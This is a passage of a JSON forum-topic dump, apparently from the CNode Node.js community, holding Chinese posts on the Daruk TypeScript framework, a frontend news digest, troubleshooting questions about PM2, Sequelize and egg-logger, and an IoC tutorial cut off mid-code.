实现，在日常的开发工作中，我们可能需要通过安装很多开源的中间件，自己完成复杂的项目配置，路由管理，以及和业务无关的工作：如日志，监控，性能等基础组件的定制。</p>\n</blockquote>\n<p>目前内部已经有大概10几个web项目在使用Daruk来构建了，比如下面这个c端的产品：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//photo.sina.cn/album_1_2841_368564.htm%3Fch%3D1%26from%3Dhot%26vt%3D4%26hd%3D1\">金正恩首会普京 双方握手 _新浪图片</a></p>\n<p>手机新浪网的高清图整站（目前落地页100% Daruk，使用TypeScript开发），频道首等其他页面还在灰度中（原来是PHP项目），流量一天1500-2000万，QPS峰值700多。</p>\n<p>Daruk自身的定位是Koa2的上层封装，所以团队中熟悉Koa开发和TS的都可以直接无门槛上手，基于约定的目录配置和周边的一些内部扩展（内部一些基础扩展还未全部开源），目前我们大前端团队已经开始承接手机新浪网的BFF层开发。</p>\n<p>回到框架本身，在一开始去年设计的时候我们还不知道有nestJs还有midwayjs这些优秀框架，今年了解到之后，我们后期也会借鉴和吸收他们的一些特性和优点进行改进。</p>\n<p>但是Daruk的Goal，从一开始的定位和之后的定位都不会变：轻巧的，易扩展的，面向对象式的MVC web框架，并拥有TS的完整开发体验。</p>\n<p>Daruk这个名字是我起的，当时沉迷塞尔达传说不能自拔，你看就是这个家伙：</p>\n<p><img src=\"//static.cnodejs.org/FjDivclyeB4Um_PiWNJwPYR-62I8\" alt=\"image.png\"></p>\n<p>当然，Daruk上手也非常简单，我们也提供了对应的脚手架工具，帮助不熟悉ts的同学可以快速玩起来：</p>\n<p>下面是一个常见的 Koa 服务代码:</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; index.js \nconst Koa = require(&quot;koa&quot;);\nconst app = new Koa();  \napp.use(async ctx =&gt; {   \n  ctx.body = &quot;Hello World&quot;;\n});  \napp.listen(3000);\n</code></pre><p>转换成 Daruk 编写的例子如下：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; src&#x2F;index.ts\nimport { Daruk } from &quot;daruk&quot;;\n\nlet app = new Daruk(&quot;myapp&quot;, {\n  rootPath: __dirname, &#x2F;&#x2F; 指定 autoloader根目录\n  debug: true &#x2F;&#x2F; 开启调试模式\n});\n\napp.run(3000);\n</code></pre><p>controllers的定义：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; src&#x2F;controllers&#x2F;index.ts\nimport { BaseController, Context, get } from &quot;daruk&quot;;\nexport default class Index extends BaseController {\n  @get(&quot;&#x2F;&quot;)\n  public async index(ctx: Context, next: Function) {\n    ctx.body = &quot;Hello world&quot;;\n  }\n}\n</code></pre><p>更多详细使用方法，可以参考文档：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//daruk-framework.github.io/daruk.org/tutorial/install.html%23%25E8%2584%259A%25E6%2589%258B%25E6%259E%25B6%25E5%25AE%2589%25E8%25A3%2585\">Daruk 安装文档</a></p>\n<p>最后，由于目前项目刚刚开源，网站的文档核心部分已经编写完成，但是后边的框架设计和最佳实践还没有全部完善，近期几周会以单独文章的形式投稿在我们自己的前端专栏，同时也希望喜欢TS的Nodejs开发者们多多支持，一起参与。</p>\n<p>：）</p>\n</div>","title":"使用Daruk和TypeScript构建你的Nodejs应用","last_reply_at":"2019-05-03T04:05:29.691Z","good":false,"top":false,"reply_count":47,"visit_count":2130,"create_at":"2019-04-27T02:00:23.894Z","author":{"loginname":"xiaojue","avatar_url":"https://avatars3.githubusercontent.com/u/289225?v=4&s=120"}},{"id":"5cc8019f05ae566f637fde51","author_id":"581ae153e90cfbec054d762a","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/276025/1556515821434-91b89639-b1b1-446e-a3a2-e625b8a04880.png#align=left&amp;display=inline&amp;height=360&amp;name=image.png&amp;originHeight=360&amp;originWidth=720&amp;size=553714&amp;status=done&amp;width=720\" alt=\"image.png\"></p>\n<p>【阿里云 TXD 前端月刊】- 热门前端技术快报，聚焦业界新视界；前端领域急速发展的节奏从未停歇，即将流逝的四月里，<a href=\"https://www.yuque.com/egg/nodejs/nodejs-12\">Nodejs</a> 发布了 v12 版本，<a href=\"https://addyosmani.com/blog/lazy-loading/\">Chrome75</a> 也将原生支持懒加载……也许是大潮将至，亦或是好事将近，总之，在下还能学！！！</p>\n<blockquote>\n<p>欢迎 <a href=\"https://zhuanlan.zhihu.com/txd-team\">订阅</a> &amp; <a href=\"https://github.com/txd-team/monthly/issues\">投稿</a>\n本期小编：<a href=\"https://github.com/Mavericker-1996\">佐七</a></p>\n</blockquote>\n<h2>学习专栏</h2>\n<h4><a href=\"https://frontendmasters.com/books/front-end-handbook/2019/\">2019 前端工程师手册（front-end-handbook-2019）</a></h4>\n<p>这个受欢迎的前端详细指南于本年度再次回归。更新了大量有用的资源、学习资料和开发工具。内容非常全面，值得一看。</p>\n<h4><a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/Layout_cookbook\">Css Layout Cookbook</a></h4>\n<p>MDN 官网为前端开发者总结的一些常用布局模块的实现方案。包括面包屑，分页，导航栏等，值得参考。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/276025/1556455431352-828407a9-780d-4743-aa43-68042bfcdbb0.png#align=left&amp;display=inline&amp;height=600&amp;name=image.png&amp;originHeight=600&amp;originWidth=696&amp;size=125343&amp;status=done&amp;width=696\" alt=\"image.png\"></p>\n<h4><a href=\"https://medium.com/%5B@bretcameron%5D(/user/bretcameron)/12-javascript-tricks-you-wont-find-in-most-tutorials-a9c9331f169d\">11 个教程中不常被提及的 JavaScript 小技巧</a></h4>\n<p>本文作者选取了 11 个在我们工作中经常出现却容易被忽略的 JavaScript 小技巧，可以帮助我们更高效的进行编码。</p>\n<h4><a href=\"https://juejin.im/post/5cbd1f0ae51d456e5e035f45#heading-14\">45 个值得收藏的 CSS 形状</a></h4>\n<p>本文列举了一些我们日常会用到的一些 CSS 形状，值得参考。此外，在Houdini 已经到来的当下，也许一句 --shape: ‘triangle’ ，即可使用，无需重复编写这些 CSS 形状。&lt;br /&gt;</p>\n<h2>新闻快报</h2>\n<h4><a href=\"https://www.yuque.com/cssconf/5th\">第五届 CSS 大会顺利举行</a></h4>\n<p>第五届 CSS 大会于 2019 年 3 月 30 日在深圳举办，本次会议共邀请了 7 位演讲嘉宾出席演讲，其中有我们熟悉的大漠，张鑫旭，勾三股四等，为我们分享了一些新时代下的 CSS 技术。</p>\n<h4><a href=\"https://addyosmani.com/blog/lazy-loading/\">Chrome75 将原生支持懒加载</a></h4>\n<p>过去我们一直通过 js 来实现图片的延迟加载，而 Chrome75 的到来将原生支持该功能。我们可以通过设置 loading 属性来控制浏览器是否延迟加载屏幕外的图像和 iframe。示例代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&lt;img src=&quot;celebration.jpg&quot; loading=&quot;lazy&quot; alt=&quot;...&quot; &#x2F;&gt;\n&lt;iframe src=&quot;video-player.html&quot; loading=&quot;lazy&quot;&gt;&lt;&#x2F;iframe&gt;\n</code></pre><p>让我们看一下效果：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/gif/276025/1556457435267-b0ee9630-61f0-46f8-9a0b-14b4cae6592f.gif#align=left&amp;display=inline&amp;height=772&amp;name=lazyload.gif&amp;originHeight=772&amp;originWidth=1342&amp;size=3336715&amp;status=done&amp;width=1342\" alt=\"lazyload.gif\"></p>\n<h4><a href=\"https://mp.weixin.qq.com/s/jrwb7rYy_p9g_L_P8oLASQ\">微软发布基于 Chromium 的预览版 Edge</a></h4>\n<p>2018 年 12 月，微软宣布 Edge 将采用 Chromium，这是由谷歌 Chrome 支持的开源项目，其中包含了不少值得我们期待的新特性像自定义元素和 shaodw dom，javascript 字体加载API等。目前预览版现在已经可以在 Windows 上使用，很快就可以在 Mac 上使用。</p>\n<h4><a href=\"http://blog.jquery.com/2019/04/10/jquery-3-4-0-released/\">jQuery 3.4.0 版本发布</a></h4>\n<p>4月10 日，jQuery 官博发文宣告 jQuery 3.4.0 正式发布。距离 2018 年 1 月发布 v 3.3.0 版已有一年多了。jQuery 官方表示，这是 3.x 系列的最后一个版本，他们将全力准备 jQuery 4.0。本次更新重点放在一些bug的修理和性能的提升。</p>\n<h4><a href=\"https://www.yuque.com/egg/nodejs/nodejs-12\">Nodejs 12发布</a></h4>\n<p>时隔一年，Node.js 12 如约而至，正式发布第一个 <a href=\"https://github.com/nodejs/Release\">Current</a> 版本。（按照当前的节奏一年两更，2063 年我们就能迎来 Node v100 了……）</p>\n<p>该版本带来了诸如：</p>\n<ul>\n<li>V8 版本更新带来好多不错的特性；</li>\n<li>HTTP 解析速度提升；</li>\n<li>启动速度大幅提升；</li>\n<li>更好的诊断报告和堆分析工具；</li>\n<li>ESM 模块更新；</li>\n</ul>\n<p>同时 <a href=\"https://nodejs.org/en/about/releases/\">Node v6</a> 也即将停止维护。</p>\n<h4><a href=\"https://vue.w3ctech.com/\">第三届 VueConf 将在上海举办</a></h4>\n<p>一年一度的 VueConf 又来啦！VueConf 2018 是在杭州举办的，Vue.js 作者尤雨溪采用了远程参与的方式，给大家带来了精彩了演讲。这一次，VueConf 2019 上海来啦，会议将在 6 月 8 号上海徐家汇华山路举办，尤大将亲临现场，给大家带来主题演讲，赶快点击链接抢票吧！</p>\n<h2>工具推荐</h2>\n<h4><a href=\"https://shipshapecode.github.io/shepherd/docs/welcome/\">Shepherd: Guide Your Users Through a Tour of Your App </a></h4>\n<p>Shepherd是一款便于我们为一款产品做新手指引的工具库，通过一些简单的api就可以实现该功能，目前对于Vue，React，Angular，Ember框架都有支持。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/gif/276025/1556459532372-fce6df6c-b6b6-4813-9c48-6241afa2a824.gif#align=left&amp;display=inline&amp;height=772&amp;name=shepherd.gif&amp;originHeight=772&amp;originWidth=1342&amp;size=1438302&amp;status=done&amp;width=1342\" alt=\"shepherd.gif\"></p>\n<h4><a href=\"https://cloudconvert.com/\">CloudConvert: 文件格式在线转换平台</a></h4>\n<p>CloudConvert 是一款强大全能格式在线转换云在线应用，支持跨平台。 … 支持输入文件 URL、Dropbox、Google Drive 文件源或者直接从电脑上传文件进行转换，你只需要一个浏览器就可以使用它，非常方便。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/276025/1556507397357-85217ee1-c574-461f-b3df-71e088cf92fa.png#align=left&amp;display=inline&amp;height=1646&amp;name=image.png&amp;originHeight=1646&amp;originWidth=2878&amp;size=765280&amp;status=done&amp;width=2878\" alt=\"image.png\"></p>\n<h4><a href=\"https://github.com/vadimdemedes/ink\">Ink: 使用 React 编写命令行界面</a></h4>\n<p>Ink 是一款使用 React 风格开发命令行界面应用 (CLI App) 的 Nodejs 工具，也就是说，我们可以使用像 React 那样的方式来组织代码，开发出运行在命令行的工具应用。Ink 2.0 可以无缝支持 React 的某些特性，比如 Hooks 或Context，还可以与 React 生态系统中的其他重要组件（比如 Redux ）发生交互。&lt;br /&gt;官方文档提供了如下的示例：</p>\n<pre class=\"prettyprint language-jsx\"><code>import React, {Component} from &#x27;react&#x27;;\nimport {render, Color} from &#x27;ink&#x27;;\n \nclass Counter extends Component {\n  constructor() {\n    super();\n    this.state = {\n      i: 0\n    };\n  }\n \n  render() {\n    return (\n      &lt;Color green&gt;\n        {this.state.i} tests passed\n      &lt;&#x2F;Color&gt;\n    );\n  }\n \n  componentDidMount() {\n    this.timer = setInterval(() =&gt; {\n      this.setState({\n      i: this.state.i + 1\n      });\n    }, 100);\n  }\n \n  componentWillUnmount() {\n    clearInterval(this.timer);\n  }\n}\n \nrender(&lt;Counter&#x2F;&gt;);\n\n</code></pre><p>终端上的输出：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/svg/276025/1556507982379-0795e747-d6a0-4631-bda8-435fd2ab8e28.svg#align=left&amp;display=inline&amp;height=250&amp;originHeight=234&amp;originWidth=540&amp;status=done&amp;width=578\" alt></p>\n<h2>热门文章</h2>\n<h4><a href=\"https://zhuanlan.zhihu.com/p/61127760\">我在阿里云做前端</a></h4>\n<p>“抓住我们核心的竞争力，并同时发现业务中的问题，跨端推进解决，这是最好的出路。” 让我们看看阿里巴巴高级前端技术专家城池大大讲述他过去几年在阿里云的前端经验。</p>\n<h4><a href=\"https://www.infoq.cn/article/ENA6ooPYgt6*bZieWfCK\">Winter 眼中的前端十年：觉醒、全栈、包袱，未来无不可为</a></h4>\n<p>为什么他能在前端圈如鱼得水？为什么他总能拿到大公司的高薪 Offer？在他眼中：前端 Leader 都该焦虑什么？为什么过去十年是前端觉醒的十年？在杭州家里，本篇文章采访了本期嘉宾 Winter，听他讲述前端行业十年的得与失。</p>\n<h4><a href=\"https://mp.weixin.qq.com/s?__biz=MzUxMzcxMzE5Ng==&amp;mid=2247491022&amp;idx=1&amp;sn=0f080050f4bb7c3365d5cfbc1b70bea1&amp;chksm=f951a88dce26219bef53994b7608b21b298324f387863401dc2d7e09d13f56782659a1cfc552&amp;xtrack=1&amp;scene=0&amp;subscene=10000&amp;clicktime=1556444647&amp;ascene=7&amp;devicetype=android-28&amp;version=27000439&amp;nettype=WIFI&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AVpkeAMGZHgDZmR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=6FpnjH0Xly5DJAnrxT8RH3mjz5WprMiG89TiVaWcA6eIM1QWBOVLN8KBvrCx5v52&amp;wx_header=1\">使用 Typescript 两年之后，它值得推荐吗</a></h4>\n<p>Typescript 近两年热度不减，很多大公司都选择去拥抱 TS，但它真的值得被推荐吗？本篇文章站在比较客观的角度从多方面讲述 TS 的优点和缺点。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/137059/1554173440911-9bd825a2-0664-4e96-b300-12a855a34e4a.png#align=left&amp;display=inline&amp;height=378&amp;name=image.png&amp;originHeight=1044&amp;originWidth=1080&amp;size=1149092&amp;status=done&amp;width=391\" alt=\"image.png\"></p>\n</div>","title":"您的四月份前端补给包已到，请查收～","last_reply_at":"2019-05-03T02:27:51.058Z","good":false,"top":false,"reply_count":3,"visit_count":1124,"create_at":"2019-04-30T08:04:47.449Z","author":{"loginname":"x-cold","avatar_url":"https://avatars1.githubusercontent.com/u/6903313?v=4&s=120"}},{"id":"5ccab35d05ae566f637fe26a","author_id":"58de5214b3e60b982d089dc3","tab":"ask","content":"<div class=\"markdown-text\"><p>因为egg-logger无法方便定制, 需要完全禁用.\n现在我要用的logger在egg中无法正常工作, 单独跑是ok的, 还没找到原因. 求助<a href=\"/user/atian25\">@atian25</a></p>\n<p>用以下代码段可以复现, 以下内容单独放个ts文件输出正常:</p>\n<pre class=\"prettyprint language-ts\"><code>import log4js from &#x27;log4js&#x27;\n\nconst logger = log4js.getLogger()\nlogger.level = &#x27;debug&#x27;\nlogger.debug(&#x27;=====================================&#x27;)\n\nconsole.log(&#x27;=====================================&#x27;)\t&#x2F;&#x2F; egg中仅此行输出\n</code></pre></div>","title":"如何完全禁用eggjs的egg-logger","last_reply_at":"2019-05-02T15:10:31.631Z","good":false,"top":false,"reply_count":3,"visit_count":405,"create_at":"2019-05-02T09:07:41.851Z","author":{"loginname":"xiaozhongliu","avatar_url":"https://avatars3.githubusercontent.com/u/17674404?v=4&s=120"}},{"id":"5c6d3191e1a81129a7ad8d2e","author_id":"5c4735a23b948a2b4ab70945","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FlPrSPQFN6_4OPWH9VXoom3pKToP\" alt=\"11111.jpg\">\n精英版8天nodejs培训视频教程，附带案例源码\n讲的很详细，分享出去，希望大家少走弯路，花更少的时间学习更多东西\n教程下载：<a href=\"https://www.sucaihuo.com/video/255.html\">https://www.sucaihuo.com/video/255.html</a></p>\n</div>","title":"精英版8天nodejs培训视频教程","last_reply_at":"2019-05-02T14:15:08.164Z","good":false,"top":false,"reply_count":3,"visit_count":1591,"create_at":"2019-02-20T10:53:05.469Z","author":{"loginname":"jtghaha","avatar_url":"https://avatars0.githubusercontent.com/u/46346950?v=4&s=120"}},{"id":"5cc8716d05ae566f637fe003","author_id":"5cc86a5c05ae566f637fdff4","tab":"share","content":"<div class=\"markdown-text\"><h2>项目主页</h2>\n<p><a href=\"https://github.com/xVanTuring/cquant\">CQuant：Async Node.js Color quantization Library</a></p>\n<h2>起因</h2>\n<p>5 年前 XadillaX 发布<a href=\"https://github.com/XadillaX/thmclrx\">thmclrx</a>,可用于提取图片的主色调。笔者原本准备使用其实现一些功能，却在安装上遇到了一些Node的版本问题。</p>\n<h2>造轮子</h2>\n<p>为了后续开发者的使用,安装方便，决定自己再造个轮子，于是就有了<a href=\"https://github.com/xVanTuring/cquant\">CQuant</a>库</p>\n<h3>预览</h3>\n<p><img src=\"https://s2.ax1x.com/2019/04/30/EGRnCF.png\" alt=\"Preview\"></p>\n<h3>优点</h3>\n<ul>\n<li>原生速度 ，(1920x1080的图片提取5色大约需要12ms)</li>\n<li>安装方便，提供Prebuild，无需C++开发工具</li>\n</ul>\n<h3>支持平台</h3>\n<p>Node.js： 6 | 8 | 10 | 11\nElectron: v3 and v4\nPlatform: Linux, Windows and macOs</p>\n<h3>所用算法</h3>\n<p>量化算法为MMCQ,算法参考自 <a href=\"http://www.leptonica.com/\">leptonica</a></p>\n<h2>Extra</h2>\n<p><a href=\"https://xvanturing.ml/\">个人主页</a>，偶尔会分享一些前端框架分析和一些乱七八糟的东西.</p>\n</div>","title":"CQuant:基于N-api的图片主色调提取库","last_reply_at":"2019-05-02T13:52:31.351Z","good":false,"top":false,"reply_count":2,"visit_count":421,"create_at":"2019-04-30T16:01:49.798Z","author":{"loginname":"xVanTuring","avatar_url":"https://avatars0.githubusercontent.com/u/11146248?v=4&s=120"}},{"id":"5cc8133fa86ae80ce64b5c58","author_id":"5cc812bba86ae80ce64b5c52","tab":"ask","content":"<div class=\"markdown-text\"><p>我从tcp消息实时抓取一些二进制byte消息流  按行存在一个文件里\n然后我想用nodejs按行读取  有什么办法么\n或者用什么方式存 能让nodejs按消息流来获取呀</p>\n</div>","title":"tcp数据流实时存放到文件中 有办法按包读取么 各位大佬 我该怎么存","last_reply_at":"2019-05-01T12:44:56.085Z","good":false,"top":false,"reply_count":3,"visit_count":497,"create_at":"2019-04-30T09:19:59.433Z","author":{"loginname":"cuijianxiong","avatar_url":"https://avatars1.githubusercontent.com/u/19885418?v=4&s=120"}},{"id":"5cc96110a86ae80ce64b5de3","author_id":"55c56e8a39273b9219336288","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://oo.t9t.io/jobs\">https://oo.t9t.io/jobs</a></p>\n<p><img src=\"https://l.ruby-china.com/photo/2019/c4b4f081-df4d-4448-be19-0c1dc357a404.png!large\" alt></p>\n<p><img src=\"https://l.ruby-china.com/photo/2019/16cabc06-688d-4abb-ad24-4ec839bb07ad.png!large\" alt></p>\n</div>","title":"有没有想过找一份为开源项目做贡献的工作, 我做了一个网站收集这类工作机会. 欢迎大家注册试用","last_reply_at":"2019-05-01T09:04:16.770Z","good":false,"top":false,"reply_count":0,"visit_count":449,"create_at":"2019-05-01T09:04:16.770Z","author":{"loginname":"timqian","avatar_url":"https://avatars3.githubusercontent.com/u/5512552?v=4&s=120"}},{"id":"5cc12d4537faec0ce1d06706","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FsJPVoGNLeApbuZx9lRwmcv4LCfm\" alt=\"image.png\">\n前一秒还在劝人学node，后一秒就被打脸了。。。羞愧难当。。。顿时找不到理由反驳。</p>\n</div>","title":"一位同学因别人说node只适合中小型，放弃node学go,大家怎么看。","last_reply_at":"2019-05-01T04:57:29.886Z","good":false,"top":false,"reply_count":33,"visit_count":2745,"create_at":"2019-04-25T03:45:09.872Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"5bb3199aede204052db80345","author_id":"5b9e04448f5b0c1c59ea0e80","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，刚刚在论坛里面专门找了一下，最近的一次询问是三个月前的（<a href=\"https://cnodejs.org/topic/5b2f02a757137f22415c4e90\">传送门</a>此前帖子），真的好期待啊……</p>\n</div>","title":"又3个月了，狼叔的《更了不起的Node.js》应该快出来了吧？","last_reply_at":"2019-05-01T03:58:53.109Z","good":false,"top":false,"reply_count":42,"visit_count":6726,"create_at":"2018-10-02T07:09:14.001Z","author":{"loginname":"tufifth","avatar_url":"https://avatars0.githubusercontent.com/u/34742669?v=4&s=120"}},{"id":"5cc7e85ba86ae80ce64b5abf","author_id":"59b0fced1b37e54f6793c3d6","tab":"ask","content":"<div class=\"markdown-text\"><blockquote>\n<p>NODE应用CPU使用率过高，可能是PM2引起的吗？</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/Fvc8CSyBAJL_0Rq1ell2PG_Rduoz\" alt=\"image.png\"></p>\n<p><img src=\"//static.cnodejs.org/FtbXd7XgTpM7u6uC2cYtEqBc1lHC\" alt=\"image.png\"></p>\n<p><img src=\"//static.cnodejs.org/Fi7yuFoGBlqw5X5Ip27J63MbDIoz\" alt=\"image.png\"></p>\n<pre class=\"prettyprint\"><code>1、app使用pm2启动，默认两个负载是上图中的&#96;node &#x2F;mnt&#x2F;pgyer&#96;\n2、app运行一段时间，比如压力测试、并发测试过程中&#96;node &#x2F;mnt&#x2F;pgyer&#96;的进程会升高，停止压测、并发测试之后对应的CPU也会降下来。反复持续一段时间之后，&#96;node&#96;进程出现，并且CPU持续变高，一直达到&#96;110%+&#96;。整个机器的CPU使用率达到了&#96;60%&#96;左右，除非杀掉&#96;node&#96;进程才会恢复正常；图2是站点不做任何访问CPU使用率的截图，还是依然如此之高。\n3、使用传统的方式&#96;node .&#x2F;app.js&#96;的方式启动一个进程，压测、并发测试等等，CPU使用率会上升但是随着压测、并发测试的结束，CPU使用率也会相应的降下来。反复几次也都是正常的。\n4、我怀疑是不是PM2使用不当呢。\n\n</code></pre></div>","title":"PM2 node进程 CPU达到116%+（帮我解决问题给红包感谢！！！）","last_reply_at":"2019-04-30T08:53:32.687Z","good":false,"top":false,"reply_count":4,"visit_count":725,"create_at":"2019-04-30T06:16:59.383Z","author":{"loginname":"xulayen","avatar_url":"https://avatars1.githubusercontent.com/u/15044564?v=4&s=120"}},{"id":"5cc6ccada86ae80ce64b5695","author_id":"55125bccd792542a29789aee","tab":"ask","content":"<div class=\"markdown-text\"><p>目前我们有一个邮件服务器搭建的需求，需要能够通过接口在项目中给用户自动生成邮箱，且希望能够有搭建邮件服务器的源码和教程。有偿求搭建。\n可以搭建这个项目的，可以在后面留言，谢谢！</p>\n</div>","title":"关于如何搭建邮件服务器，有偿","last_reply_at":"2019-04-30T07:38:07.296Z","good":false,"top":false,"reply_count":1,"visit_count":560,"create_at":"2019-04-29T10:06:37.230Z","author":{"loginname":"myadmin","avatar_url":"https://avatars2.githubusercontent.com/u/6794499?v=4&s=120"}},{"id":"5cc7c342a86ae80ce64b5a18","author_id":"54582a566537f4d52c414e41","tab":"ask","content":"<div class=\"markdown-text\"><p>koa+sequelize 间歇性的报超时，我该从何处着手开始排查 SequelizeConnectionError: connect ETIMEDOUT</p>\n<p>啥叫间歇性：就是每天总报三四个这样的错误，请求就500了，但是程序也没重启，其他请求都好好的。</p>\n<p>连接配置\n&quot;teacher&quot;: {\n\t\t“db”: {\n\t\t\t“logging”: false,\n\t\t\t“username”: “prod”,\n\t\t\t“password”: “xxxxxxxxxxxx”,\n\t\t\t“dialect”: “mysql”,\n\t\t\t“database”: “teacher”,\n\t\t\t“host”: “xxxxxxxxxxxx”,\n\t\t\t“port”: “3306”,\n\t\t\t“operatorsAliases”: true,\n\t\t\t“define”: {\n\t\t\t\t“freezeTableName”: true,\n\t\t\t\t“paranoid”: true\n\t\t\t},\n\t\t\t“pool”: {\n\t\t\t\t“max”: 30,\n\t\t\t\t“min”: 0,\n\t\t\t\t“acquire”: 10000,\n\t\t\t\t“idle”: 10000\n\t\t\t}\n\t\t}\n\t}</p>\n</div>","title":"koa+sequelize 间歇性的报超时，我该从何处着手开始排查 SequelizeConnectionError: connect ETIMEDOUT","last_reply_at":"2019-04-30T06:15:32.986Z","good":false,"top":false,"reply_count":2,"visit_count":368,"create_at":"2019-04-30T03:38:42.483Z","author":{"loginname":"wxsong","avatar_url":"https://avatars1.githubusercontent.com/u/8464014?v=4&s=120"}},{"id":"5cc7b20305ae566f637fdc00","author_id":"577f0e4369d72f545483ca04","tab":"ask","content":"<div class=\"markdown-text\"><h2><img src=\"//static.cnodejs.org/FsbCoWFofHWrxmOPh3cbTAikwu34\" alt=\"image.png\">\nnode版本：\n升级前：v11.2.~\n升级后：v12.0.0\n也将npm升级到最新版本。\n目前运行项目就报这个问题。\n试过重新 <em>create-react-app</em> ，运行时也同样报错，如图**\n<img src=\"//static.cnodejs.org/FpzXYklX2yVnEWsfvKb8I3SEZHx-\" alt=\"image.png\">\n遇到这种问题，怎么处理？</h2>\n<p>补充内容：\n<em>Error: fsevents is not a constructor</em>这个我百度了，解决方案是卸载再升级truffle，试了，结果跟第二个图一样。**</p>\n</div>","title":"react项目，升级node版本后，运行yarn start报错","last_reply_at":"2019-04-30T03:16:11.448Z","good":false,"top":false,"reply_count":4,"visit_count":388,"create_at":"2019-04-30T02:25:07.751Z","author":{"loginname":"imizao","avatar_url":"https://avatars1.githubusercontent.com/u/20340304?v=4&s=120"}},{"id":"5cc6ced2a86ae80ce64b56a7","author_id":"58cb34c8246a2aeb194a5489","tab":"share","content":"<div class=\"markdown-text\"><p>你有没有过这样一个经历，一个项目立项之时，什么模块化啊，什么抽象啊，什么解耦啊，什么可复用组件啊什么的，哪个高端用哪个，可是项目发展到中期，随着模块的增加，什么可复用，能用就行，什么模块化，载入就行，久而久之，项目越来越大，随之也越来越臃肿，越来越难以维护，改一处看似简单的模块，却发现八杆子打不着的地方居然也被影响了，真真是写时一时爽，维护时更加爽！</p>\n<p>那项目大了，维护成了难题，如何优化呢，怎么解决呢！</p>\n<h3>IOC (InversionofControl 控制反转)</h3>\n<p>看英文缩写，是不是有点高大上，其实这个理念在后端是非常常见的，而前端很少涉及到。不过现代前端也可以在项目中实践了，而且很契合。</p>\n<h4>三个准则</h4>\n<ul>\n<li>高层次的模块不应该依赖于低层次的模块，它们都应该依赖于抽象</li>\n<li>抽象不应该依赖于具体实现，具体实现应该依赖于抽象</li>\n<li>面向接口编程而不是面向实现编程</li>\n</ul>\n<h4>一个案例</h4>\n<p>放着这些个准则不说，先用一个案例来说明下：</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; screen.ts\nexport default class Screen {\n  name = &quot;Retina&quot;;\n}\n\n&#x2F;&#x2F; cpu.ts\nexport default class Cpu {\n  name = &quot;i5&quot;;\n}\n\n&#x2F;&#x2F; battery\n&#x2F;&#x2F; 电池模式，普通模式，低电量，高电量\ntype TMode = &quot;normal&quot; | &quot;low&quot; | &quot;high&quot;;\nexport default class Battery {\n  mode: string;\n  constructor(option: { mode: TMode } = { mode: &quot;normal&quot; }) {\n    this.mode = option.mode;\n  }\n}\n\n\n&#x2F;&#x2F; mac.ts\n\nimport Screen from &quot;.&#x2F;screen&quot;;\nimport Cpu from &quot;.&#x2F;cpu&quot;;\nimport Battery from &quot;.&#x2F;battery&quot;;\n\nexport default class MacBook {\n  cpu: Cpu;\n  screen: Screen;\n  battery: Battery;\n  constructor() {\n    this.cpu = new Cpu();\n    this.screen = new Screen();\n    this.battery = new Battery();\n  }\n  start() {\n    console.log(\n      &#96;your mac screen is battery mode is ${this.battery.mode}, screen is ${\n        this.screen.name\n      } and cpu is ${this.cpu.name}&#96;\n    );\n  }\n}\n\n\n&#x2F;&#x2F; index.ts\n\nimport MacBook from &quot;.&#x2F;mac&quot;;\n\nlet mac = new MacBook();\n\nmac.start();\n</code></pre><p>首先建立一个<code>index.ts</code>启动文件，mac壳子 <code>mac.ts</code>，它内部有三个模块，<code>cpu</code> ，<code>screen</code> 和 <code>battery</code> ，这个三个属性分别引用的是文件外的模块。</p>\n<p>代码这样写，其实没有什么问题的，执行 <code>index</code> 就能看到结果，查看到这个mac类的配置，那么，如果说我要设置mac电池配置 <code>mode</code> 为低电量，那么我就不得不去 <code>mac.ts</code> 主模块里修改电池的配置。</p>\n<pre class=\"prettyprint language-js\"><code>this.battery = new Battery({mode: &quot;low&quot;});\n</code></pre><p>这样改，其实是没有什么问题的，但是，mac其中的一个模块修改了，为什么壳子 <code>mac.ts</code> 这个文件也要跟着懂呢，而且这个壳子里有mac所有的模块依赖，之前测试通过了，这次修改了，能不能保证一定没有出错呢，所以这次的模块改动就是我上面说到的问题，那如何改动呢？</p>\n<h4>第一次优化</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; mac.ts\n\nimport Screen from &quot;.&#x2F;screen&quot;;\nimport Cpu from &quot;.&#x2F;cpu&quot;;\nimport Battery from &quot;.&#x2F;battery&quot;;\n\ninterface IMac {\n  cpu: Cpu;\n  screen: Screen;\n  battery: Battery;\n}\n\nexport default class MacBook {\n  cpu: Cpu;\n  screen: Screen;\n  battery: Battery;\n  constructor(option: IMac) {\n    this.cpu = option.cpu;\n    this.screen = option.screen;\n    this.battery = option.battery;\n  }\n  start() {\n    console.log(\n      &#96;your mac screen is battery mode is ${this.battery.mode}, screen is ${\n        this.screen.name\n      } and cpu is ${this.cpu.name}&#96;\n    );\n  }\n}\n\n\n&#x2F;&#x2F; index.ts\n\nimport MacBook from &quot;.&#x2F;mac&quot;;\nimport Battery from &quot;.&#x2F;battery&quot;;\nimport Cpu from 